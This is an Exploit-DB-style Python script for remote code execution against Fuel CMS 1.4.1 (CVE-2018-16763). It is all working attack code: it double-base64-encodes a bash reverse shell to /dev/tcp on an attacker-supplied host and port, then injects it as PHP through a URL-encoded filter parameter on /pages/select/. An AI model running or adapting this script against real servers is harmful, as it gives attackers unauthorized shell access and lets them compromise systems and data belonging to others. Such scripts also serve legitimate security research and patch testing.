# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2024-01-17
# Original Exploit Author: 0xd0ff9
# Improved by 20100dbg
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import base64
import requests
import urllib
import sys

if len(sys.argv) != 4 or sys.argv[1] in ['-h', '--help']:
    print("Exploit fuel CMS 1.4.1")
    print("Please start netcat listener on LPORT")
    print("usage :", sys.argv[0], "<fuel base URL> <LHOST> <LPORT>")
    exit(2)
else:
    url = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]


payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1".encode()
payload = base64.b64encode(payload)
payload = base64.b64encode(payload)
payload = f'echo {payload.decode()} | base64 -d | base64 -d | bash'

cmd_url = url + "/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.parse.quote(payload)+"%27%29%2b%27"
r = requests.get(cmd_url)

"""
idx = r.text.find("</div>") +6
idx2 = r.text.find("<div style", idx)
print(r.text[idx:idx2].strip())
"""
